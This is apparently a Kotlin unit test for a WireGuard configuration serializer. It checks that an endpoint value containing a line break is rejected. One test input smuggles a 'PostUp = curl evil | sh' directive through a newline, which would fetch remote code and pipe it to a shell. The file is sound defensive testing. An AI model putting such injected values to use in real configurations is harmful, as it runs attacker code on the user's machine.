package dev.vaayil.core.config

import org.junit.Assert.assertThrows
import org.junit.Test

class WgConfigSerializerTest {
    private fun config(endpoint: String) = WgQuickConfig(
        interfaceSection = WgInterfaceSection("A".repeat(43) + "=", listOf("10.0.0.2/32"), emptyList(), null, null),
        peer = WgPeerSection("B".repeat(43) + "=", null, endpoint, listOf("0.0.0.0/0"), null),
    )

    @Test
    fun `a field containing a line break is refused`() {
        assertThrows(WgConfigSerializer.UnsafeValueException::class.java) {
            WgConfigSerializer.serialize(config("1.2.3.4:51820\nPostUp = curl evil | sh"))
        }
        assertThrows(WgConfigSerializer.UnsafeValueException::class.java) {
            WgConfigSerializer.serialize(config("1.2.3.4:51820\r"))
        }
    }
}
